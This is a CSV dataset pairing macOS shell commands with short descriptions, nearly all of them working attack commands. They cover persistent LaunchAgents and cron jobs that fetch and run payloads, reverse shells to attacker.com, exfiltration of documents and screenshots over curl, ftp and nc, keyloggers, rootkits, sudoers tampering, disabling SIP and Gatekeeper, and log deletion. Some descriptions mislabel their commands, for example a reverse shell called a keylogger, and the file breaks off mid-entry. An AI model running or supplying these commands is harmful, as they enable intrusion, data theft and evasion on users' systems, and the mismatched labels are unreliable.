"cmd","description"
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"zip -er sensitive_documents.zip ~/Documents/Sensitive/* -P 1234 && curl --upload-file ./sensitive_documents.zip ftp://attacker.com/uploads/","Sensitive documents are compressed into a zip file with a weak password before being exfiltrated."
"ps aux | grep -i 'securityd'","Enumeration of running processes to identify security monitoring tools."
"kill -9 1234","Forceful termination of a monitoring process by process ID."
"nohup ./stealth_process &>/dev/null & disown","Creating a process that hides its presence from the process list."
"curl -s http://malicious-url.com/fakeupdate.sh | bash","Malware installation using a disguised script that appears to be a legitimate software update."
"hdiutil mount fakecodec.dmg && open /Volumes/FakeCodec/Install.pkg","Trojan application execution that masquerades as a benign video codec installer."
"echo 'while true; do nc -l 4444 -e /bin/bash; done' | nohup bash &","Backdoor payload execution by injecting code into an existing trusted process."
"launchctl submit -l com.hidden.webcam -- /usr/bin/python -c 'import cv2; camera = cv2.VideoCapture(0); ret, image = camera.read(); cv2.imwrite(""/Users/Shared/captured.jpg"", image)'","Webcam hijacking by installing a hidden service that silently captures images."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence on a macOS system by inserting a malicious script into login items."
"tar -czvf confidential-docs.tar.gz ~/Documents/confidential && curl --upload-file ./confidential-docs.tar.gz http://malicious-url.com/upload","Compressing and exfiltrating sensitive documents from a macOS system using tar and gzip."
"zip -r /tmp/documents.zip ~/Documents && openssl base64 -in /tmp/documents.zip | mail -s 'Documents' recipient@example.com","Exfiltrating documents from a macOS system and sending them via email."
"ssh -f -N -T -R 2222:localhost:22 user@attacker.com","Persistence via SSH tunneling for unauthorized remote access and data exfiltration."
"hydra -l user -P /path/to/wordlist.txt ssh://target.com","Using SSH to brute force access to a remote system."
"ssh -f -N -T -R 9999:localhost:3306 user@attacker.com","Establishing a reverse SSH tunnel to forward ports for capturing network traffic."
"while true; do top -l 1 | grep -E 'process_name|PID' >> /tmp/hiddenlog; sleep 300; done","Stealth monitoring of system processes on macOS using the top command."
"echo '* * * * * echo ""malicious code""' >> /etc/crontab","Privilege escalation by injecting code into a root-owned cron job file without proper permissions."
"echo '* * * * * /usr/local/bin/malicious_script.sh' | crontab -","Using cron jobs for persistence by executing a script from an unauthorized location every minute."
"echo '* * * * * curl -fsSL http://malicious-url.com/payload.sh | bash' | crontab -","Bypassing security measures with cron-based triggers to download and execute a payload."
"csrutil disable","Disabling System Integrity Protection (SIP) to allow cron job execution with elevated privileges."
"bash -c ""$(curl -fsSL http://malicious-url.com/install.sh)""","Malware installation through a disguised Bash script attached to an email, which when executed, downloads a payload from a remote server and runs it."
"echo 'malicious.server.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","Persistent SSH key exchange manipulation by adding a malicious server's public key to the known_hosts file."
"echo 'Protocol 1' >> ~/.ssh/config","Forcing an SSH protocol downgrade to a less secure version susceptible to known vulnerabilities."
"for user in $(cat users.txt); do for pass in $(cat passwords.txt); do ssh $user@victim.com -o 'BatchMode=no' -o 'PasswordAuthentication=yes' -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -o 'IdentitiesOnly=yes' -o 'ChallengeResponseAuthentication=no' -o 'KbdInteractiveAuthentication=no' -o 'PubkeyAuthentication=no' -o 'RhostsRSAAuthentication=no' -o 'RSAAuthentication=no' -o 'HostbasedAuthentication=no' -o 'GSSAPIAuthentication=no' -o 'GSSAPIDelegateCredentials=no' -o 'PasswordAuthentication=yes' -o 'UsePAM=no' -o 'ServerAliveInterval=60' -o 'ServerAliveCountMax=3' -p 22 -v -f -N -l $user -pw $pass; done; done","Automating SSH brute force attacks using a script to try various password combinations on a list of usernames."
"osascript -e 'do shell script ""chown root: /tmp/unsigned_driver.kext && chmod 4755 /tmp/unsigned_driver.kext && kextload /tmp/unsigned_driver.kext"" with administrator privileges'","Privilege escalation through exploitation of a kernel vulnerability using an unsigned driver to abuse IOKit interfaces."
"touch -a -m -t 202301010000 /path/to/file","Changing file access and modification times to hide evidence of file access on a macOS system."
"curl -s http://compromised-website.com/malicious-install.sh | /bin/bash","Malware installation using a malicious bash script hosted on a compromised website."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.dropper</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/dropper.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.dropper.plist && launchctl load ~/Library/LaunchAgents/com.malicious.dropper.plist","Persistence via malicious plist file to execute a dropper script every 5 minutes."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets and analyzing traffic for sensitive information on a macOS system."
"*/5 * * * * sudo spctl --master-disable","Persistence through a cron job that disables macOS Gatekeeper allowing unsigned code to run every 5 minutes."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Persistence mechanism by adding an SSH key to the authorized_keys for silent access."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfl9Mw81EY82eQp1R3LC0Kk2UQHdZm4eU9GkzZ6EPT5EDyH9L7J3X8Hkv8J4KgX4FjTbXxqEz8roGsGjx+qG3TQv8gkKFS8s6M4TPT4vz0YqyGf6JmG/4Ch5S9qC2sMj9lWgA0TISpHdNbzyQgzwNtX+5l9HH5Td1rVz485vjkk3MgG4c9kY3vgVG68HIdzw4w5iJl3s1HxLJ+zQ7p3t5tMzxE3z5iCkmuZJ3yUqVp9P+5fXq5sMJRKeL5H3PYyW9MdKPqBmJ3lLb9L2R5r8GGH2ZLJh9L1tUpUJ8dsS3zVLAVcPHp4pvx+J6S1ZxJw0xFDZxMnW2sdbMzHJ5cdx9 unauthorized_key' >> ~/.ssh/authorized_keys","Establishing unauthorized remote access by appending malicious SSH keys to the authorized_keys file."
"curl -s http://example.com/malicious-install.sh | sh","Malware installation using a disguised script from a remote server."
"mkdir /usr/local/.hidden && curl -o /usr/local/.hidden/.rootkit http://example.com/rootkit && chmod +x /usr/local/.hidden/.rootkit && /usr/local/.hidden/.rootkit","Rootkit embedding through a hidden directory and file."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious-command</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing boot persistence with a Launch Daemon."
"curl -o firmware-flasher http://example.com/firmware-flasher && chmod +x firmware-flasher && ./firmware-flasher --flash /path/to/malicious-firmware.bin","UEFI firmware modifications using a third-party flashing tool."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism through LaunchAgents by loading a malicious property list file."
"rar a -pYourPassword -v10m -m5 sensitive_files.rar /path/to/sensitive/documents/*","Compressing sensitive documents into a password-protected split archive using rar on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.remote.access</string>
	<key>ProgramArguments</key>
	<array>
		<string>bash</string>
		<string>-c</string>
		<string>curl -s http://attacker.com/modrewrite_exploit.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.remote.access.plist && launchctl load ~/Library/LaunchAgents/com.remote.access.plist","Persistence via malicious plist to maintain remote access by exploiting mod_rewrite vulnerabilities in Apache servers."
"ps aux","Enumeration of all running processes on a macOS system to identify potential targets for exploitation."
"while :; do yes > /dev/null & done","Inducing system resource exhaustion by spawning multiple instances of a command that consumes CPU resources."
"leak() { while true; do dd if=/dev/zero bs=1m | gzip | gzip -d > /dev/null & done }; leak","Simulating a memory leak on macOS by allocating memory without releasing it."
"echo 'ssh-rsa AAAAB3Nza... attacker@malicious.com' >> ~/.ssh/authorized_keys","Persistence by adding a malicious SSH key to the authorized_keys file to maintain remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/keylogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to log keystrokes."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &","Remote access tool configuration using bash script."
"curl -o ~/Library/Scripts/keylogger.sh http://malicious-url.com/keylogger.sh && chmod +x ~/Library/Scripts/keylogger.sh && ~/Library/Scripts/keylogger.sh","Keylogger installation via curl and execution."
"sudo fs_usage | grep 'WRONLY' | grep '/Volumes/'","Detecting unauthorized file copies by monitoring write operations to external drives."
"echo 'while true; do curl http://malicious-url.com/script.sh | bash; sleep 300; done' > ~/.hidden_script && chmod +x ~/.hidden_script && echo 'launchctl load -w /System/Library/LaunchDaemons/com.hidden.script.plist' >> ~/.bash_profile","A scenario where a hidden file in a user's home directory is used to persistently run a malicious script at system startup."
"zip -r /tmp/sensitive_data.zip ~/Documents/sensitive/* && sshpass -p 'password' scp /tmp/sensitive_data.zip user@remote-server.com:/path/to/store","Compressing sensitive files in the Documents directory and exfiltrating them to a remote server using scp with password authentication."
"log stream --predicate 'eventMessage contains ""keystroke""' > /tmp/keystroke.log","Data exfiltration through keylogging on macOS systems."
"nohup ./hidden_process &","Stealthy launch of a process on a macOS system."
"mv malicious_program /usr/local/bin/legitimate_process && /usr/local/bin/legitimate_process","Process masquerading to evade detection on macOS."
"crontab -l | { cat; echo ""* * * * * osascript -e 'do shell script \""launchctl load /Library/LaunchDaemons/com.malicious.plist\"" with administrator privileges'""; } | crontab -","Injecting code into an existing cron job to achieve persistence with privilege escalation on a macOS system."
"mkdir -p ~/Library/LaunchAgents && echo '{""Label"":""com.hidden.agent"",""RunAtLoad"":true,""ProgramArguments"":[""/usr/bin/osascript"",""-e"",""do shell script \""/path/to/malicious/script.sh\"" with administrator privileges""]}' > ~/Library/LaunchAgents/com.hidden.agent.plist && launchctl load ~/Library/LaunchAgents/com.hidden.agent.plist","Persistence mechanism using a hidden Launch Agent to execute a script at user login"
"curl -s http://phishing-domain.com/malware_installer.sh | sh","Malware installation via a disguised script downloaded from a phishing email."
"grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}' /path/to/database/files/* > extracted_emails.txt","Extracting email addresses from the local database files for a phishing campaign."
"sqlite3 ~/Library/Application\ Support/AddressBook/AddressBook-v22.abcddb 'SELECT ZFIRSTNAME, ZLASTNAME, ZEMAIL FROM ZABCDEMAILADDRESS;' > contacts_for_phishing.csv","Querying system databases to gather contact information for targeted phishing."
"Capturing keystrokes to obtain passphrases and exfiltrating data via encrypted email from a macOS system.","A scenario where confidential information is exfiltrated from a macOS system by capturing keystrokes to obtain passphrases and then emailing the information out using an encrypted email content."
"osascript -e 'tell application ""System Events"" to keystroke ""curl --upload-file ~/Documents/confidential.txt --user user:passphrase --ssl-reqd smtp://smtp.example.com:465/""'","Provide the code snippet for the described scenario."
"zip --password SECRET archive.zip sensitive.doc && curl --upload-file ./archive.zip ftp://attacker.com/uploads/","Encrypting documents before exfiltration to a remote server."
"exiftool -all= *.jpg && tar -czf images.tar.gz *.jpg && nc -w 3 attacker.com 1234 < images.tar.gz","Scrubbing metadata from image files before sending them."
"find ~/Documents -type f -name '*.pdf' -exec gpg --encrypt --recipient 'user@example.com' {} \; && tar -czf encrypted-docs.tar.gz ~/Documents/*.gpg && curl --upload-file ./encrypted-docs.tar.gz ftp://attacker.com/documents/","Automating the collection and transmission of documents from a directory."
"*/5 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh","Persistence mechanism using a cron job to execute a script hosted on a remote server every 5 minutes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_payload</string>
		<string>http://malicious-url.com/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","A launch daemon that persists on the system and executes a downloaded malicious payload on system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>system_profiler SPHardwareDataType | curl -d @- http://malicious-url.com/report</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' | tee ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Malware launch agent that sends system information to a remote server at regular intervals."
"zip -r encrypted_files.zip ~/Documents/SensitiveData -e","Compressing sensitive files before exfiltration."
"cat image.jpg encrypted_files.zip > hidden.jpg","Hiding compressed files in image metadata."
"steghide embed -cf picture.jpg -ef secret.txt","Using steganography tools to conceal data within an image."
"osascript -e 'do shell script ""chown root:wheel /path/to/unsigned_driver.kext && chmod -R 755 /path/to/unsigned_driver.kext && kextload /path/to/unsigned_driver.kext"" with administrator privileges'","Privilege escalation by exploiting a kernel vulnerability through the use of an unsigned driver to modify kernel extensions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to maintain a keylogger on the system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item modification using AppleScript to add a malicious application to user login items."
"*/30 * * * * osascript -e 'tell application ""System Events"" to keystroke ""d"" using {command down, shift down}' && zip -r ~/Documents.zip ~/Documents && curl --silent --output /dev/null --data-binary @~/Documents.zip http://trusted-app.com/upload","Persistence via cron job to exfiltrate documents while evading network monitoring."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a malicious Launch Agent to execute a script at login"
"find / -mmin -5 -type f -exec stat -f '%m%t%Sm %N' {} \;","Identifying unauthorized changes to file access timestamps in the system logs."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login"
"curl -o ~/Library/RAT http://unauthorized-url.com/remote_access_tool && chmod +x ~/Library/RAT && ~/Library/RAT","Downloading a remote access tool from an unauthorized URL"
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to maintain access"
"echo 'Ciphers aes128-cbc,3des-cbc' >> /etc/ssh/sshd_config && launchctl stop com.openssh.sshd && launchctl start com.openssh.sshd","Modifying the SSH configuration to use weak ciphers for establishing connections."
"while true; do cat /dev/null > ~/.keystroke_log; sudo opensnoop -v | grep -i 'keystrokes' >> ~/.keystroke_log & done","Tracking user activities by persistently logging keystrokes using a hidden process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every time the user logs in."
"*/5 * * * * curl -fsSL http://malicious-url.com/payload.sh | bash","Persistence mechanism using a cron job to execute a script from a remote server every 5 minutes on a macOS system."
"echo 'int main() { char large_string[128]; for (int i = 0; i < 300; i++) large_string[i] = 'A'; system(""/usr/bin/vulnerable_service""); return 0;}' > exploit.c && gcc -o exploit exploit.c && ./exploit","Privilege escalation by exploiting buffer overflow vulnerability in a macOS system service."
"Appending a malicious host key to the known_hosts file to redirect the SSH connection.","A scenario where an attacker manipulates the known_hosts file to redirect SSH connections to a malicious server."
"echo 'malicious-server.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","What would be the shell command to achieve this known_hosts file manipulation?"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system startup."
"curl -s http://compromised-website.com/adscript.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation via a disguised Bash script downloaded from a pop-up advertisement on a compromised website."
"DYLD_INSERT_LIBRARIES=/path/to/malicious_library.dylib /usr/bin/sudo","Injecting code into privileged processes through dynamic library loading."
"echo 'export DYLD_LIBRARY_PATH=/malicious/directory' >> ~/.bash_profile && source ~/.bash_profile","Gaining higher privileges by hijacking dylib loading."
"find / -name '*.dylib' -mtime -1","Monitoring for suspicious dynamic library activity."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.extension</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/kextload</string>
		<string>/Library/Extensions/malicious.kext</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.extension.plist && launchctl load /Library/LaunchDaemons/com.malicious.extension.plist && csrutil disable","Persistence via malicious plist to load a kernel extension without system integrity protection."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations where the sudoers file is writable by a group."
"cp /bin/sh /tmp/privileged_sh && chmod +s /tmp/privileged_sh","Privilege escalation by exploiting a vulnerable setuid application on macOS."
"echo '/tmp/hijack_library.so' > /etc/ld.so.preload","Hijacking library paths to gain higher privileges using setuid binaries."
"TF=$(mktemp) && echo 'int main() { setuid(0); system(""/bin/bash""); return 0; }' > $TF.c && gcc $TF.c -o $TF && chmod +s $TF && $TF","Abusing setuid binaries to execute arbitrary code with elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.keylogger</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-o</string><string>/tmp/.keylogger</string><string>http://malicious-url.com/keylogger</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to establish a keylogger with remote control capabilities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.ransomware</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/ransomware</string>
		<string>http://malicious-url.com/ransomware</string>
		<string>&&</string>
		<string>chmod</string>
		<string>+x</string>
		<string>/tmp/ransomware</string>
		<string>&&</string>
		<string>/tmp/ransomware</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.ransomware.plist && launchctl load ~/Library/LaunchAgents/com.malicious.ransomware.plist","Persistence via malicious plist to run ransomware at system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-X</string>
		<string>POST</string>
		<string>--data-binary</string>
		<string>@/tmp/keystrokes.log</string>
		<string>http://attacker.com/collect</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist && echo 'while [ true ]; do logKext=`kextstat | grep com.malicious.keylogger` && if [ ""$logKext"" != """" ]; then curl -X POST --data-binary @/tmp/keystrokes.log http://attacker.com/collect; fi; sleep 300; done' > ~/.keylogger.sh && chmod +x ~/.keylogger.sh && nohup ~/.keylogger.sh &","Persistence via malicious plist to establish a keylogger that sends data to a remote server."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"sudo bash -c 'curl -s http://malicious-url.com/rootkit -o /usr/local/bin/rootkit && chmod +x /usr/local/bin/rootkit && /usr/local/bin/rootkit'","Rootkit embedding into the system with elevated privileges."
"echo 'sudo nohup /path/to/malicious/app &' >> ~/.bash_profile","Achieving boot persistence for a malicious application."
"csrutil disable && mount -uw / && mv /path/to/malicious_file /System/Library/LaunchDaemons/","Bypassing System Integrity Protection to modify protected system files."
"curl -o ~/Library/LaunchAgents/com.malicious.plist http://malicious-url.com/malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file that executes a downloaded payload."
"cat /var/log/auth.log | grep 'sshd' > ~/Desktop/ssh_login_attempts.txt","Tracking user authentication events via unauthorized access to the auth.log file."
"osascript -e 'do shell script ""echo malware >> /etc/sudoers"" with administrator privileges'","Injecting code into a privileged process on macOS to escalate privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.loginitem</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist in LaunchAgents to execute a script every login."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation using a disguised script downloaded from a remote server."
"curl -s -o ~/.hidden http://malicious-url.com/rootkit && chmod +x ~/.hidden && ~/.hidden","Rootkit embedding into the system by executing a hidden binary."
"sudo kextload /tmp/malicious.kext","Kernel module injection using a malicious loadable kernel module."
"sudo nvram boot-args=""kext-dev-mode=1""","Disabling secure kernel extension loading to allow unsigned kexts."
"chmod 4777 /bin/bash","A scenario where file permissions are manipulated to escalate privileges on a macOS system."
"chmod 600 /var/log/*","A method to alter system logs permissions to hide malicious activity."
"for log in /var/log/*; do chmod 600 ""$log""; done","A script to automate the process of changing log permissions."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing commands without a password."
"sudo chmod 777 /var/log/system.log","Altering system logs permissions to gain unauthorized access and modify logs."
"sudo rm -rf /var/log/*","Deleting system logs to cover tracks after gaining elevated privileges."
"osascript -e 'display notification ""Urgent software update required"" with title ""System Update""' && curl -s -o ~/Downloads/Update.pkg http://malicious-url.com/fake-update.pkg && open ~/Downloads/Update.pkg","Malware installation through a fake software update notification script that deceives the user into downloading a malicious package."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload</string><string>-o</string><string>/tmp/payload</string><string>&&</string><string>chmod</string><string>+x</string><string>/tmp/payload</string><string>&&</string><string>/tmp/payload</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious Launch Agent"
"curl -s http://example.com/malicious/install.sh | /bin/bash","Malware installation using a disguised script downloaded from the internet."
"osascript -e 'tell app ""System Events"" to display dialog ""A critical software update is available. Please enter your password to continue:"" default answer """" with hidden answer with icon 2'","Phishing attack script that masquerades as a legitimate software update."
"python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((""attacker.com"", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([""/bin/sh"",""-i""]);'","Keylogging script that captures keystrokes and sends them to a remote server."
"screencapture -x ~/screenshot.png && curl -T ~/screenshot.png ftp://attacker.com --user username:password","Screen capture command that silently takes screenshots and uploads them to a remote server."
"while read -r line; do screencapture -x ~/Desktop/screenshot_$(date +%Y%m%d%H%M%S).png; done < <(log stream --predicate 'eventMessage contains ""KeyDown""')","Capturing keystrokes and taking screenshots on a macOS system whenever a specific key is pressed."
"echo 'Defaults timestamp_timeout=0' >> /etc/sudoers && echo 'Defaults !tty_tickets' >> /etc/sudoers && sudo -k && sudo malicious_script.sh","Persistent execution of a malicious script by exploiting sudo misconfigurations and timestamp spoofing to bypass tty_tickets."
"curl -s http://malicious-url.com/fakeUpdate.sh | /bin/bash","Malware installation through a disguised Bash script that masquerades as a software update."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
